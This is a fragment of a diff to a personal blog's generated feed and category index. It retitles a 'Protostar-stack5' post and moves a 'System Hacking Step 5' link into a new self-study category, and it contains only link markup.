+        <pubDate>Fri, 12 Aug 2022 21:25:23 +0900</pubDate>
         <link>http://localhost:4000/blog/system-hacking-step5/</link>
         <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step5/</guid>
       </item>
@@ -3541,7 +3740,7 @@ rsp -= 8 //stack grows from high to low
     &lt;a name=&quot;System Hacking Basic&quot;&gt;&lt;/a&gt;
      
     &lt;article class=&quot;center&quot;&gt;
-      &lt;h6&gt;&lt;a href=&quot;/blog/protostar-stack5-x86-x64/&quot;&gt;Protostar-stack5.c x86 &amp;amp; x86-64(Updating)&lt;/a&gt;&lt;/h6&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/protostar-stack5-x86-x64/&quot;&gt;Protostar-stack5.c x86 &amp;amp; x86-64&lt;/a&gt;&lt;/h6&gt;
     &lt;/article&gt;
 
 
@@ -3554,12 +3753,6 @@ rsp -= 8 //stack grows from high to low
     
     &lt;article class=&quot;center&quot;&gt;
       &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step5-2/&quot;&gt;System Hackig Step 5-2&lt;/a&gt;&lt;/h6&gt;
-    &lt;/article&gt;
-
-
-    
-    &lt;article class=&quot;center&quot;&gt;
-      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step5/&quot;&gt;System Hackig Step 5&lt;/a&gt;&lt;/h6&gt;
     &lt;/article&gt;
 
 
@@ -3596,6 +3789,21 @@ rsp -= 8 //stack grows from high to low
     
     &lt;article class=&quot;center&quot;&gt;
       &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step2/&quot;&gt;System Hackig Step 2&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#System Hacking Basic, Taught By Myself&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/System Hacking Basic, Taught By Myself&quot;&gt;System Hacking Basic, Taught By Myself&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;System Hacking Basic, Taught By Myself&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/system-hacking-step5/&quot;&gt;System Hackig Step 5&lt;/a&gt;&lt;/h6&gt;
     &lt;/article&gt;
 
 
